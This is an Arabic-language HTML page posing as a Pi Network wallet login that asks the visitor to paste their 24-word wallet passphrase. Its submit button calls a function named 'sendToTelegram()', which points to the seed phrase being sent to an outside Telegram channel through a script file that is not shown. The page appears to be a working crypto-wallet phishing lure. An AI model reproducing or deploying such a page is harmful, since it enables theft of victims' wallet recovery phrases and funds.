<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet - Pi Network</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <header>
        <div class="logo">
            <img src="wallet-logo.png" alt="Wallet Logo">
        </div>
    </header>

    <main>
        <h1>ألصق رمز المرور الخاص بك لفتح المحفظة</h1>

        <textarea id="passphrase" placeholder="أدخل عبارة المرور المكونة من 24 كلمة هنا"></textarea>

        <button onclick="sendToTelegram()">الدخول باستخدام رمز المرور</button>
        <button class="touch-button" onclick="showTouchAlert()">الدخول باستخدام معرف اللمس</button>

        <p>
            بما أن المحفظة من غير حراسة، يمكن الوصول إلى عبارة مرور المحفظة حصريًا بواسطةك فقط.
            استعادة عبارة المرور أمر مستحيل حاليًا.
        </p>

        <p>
            هل فقدت عبارة المرور الخاصة؟ <a href="#">يمكنك إنشاء محفظة جديدة</a> ولكن لن تتمكن من الوصول إلى أي باي في محافظتك السابقة.
        </p>
    </main>

    <script src="script.js"></script>

</body>
</html>
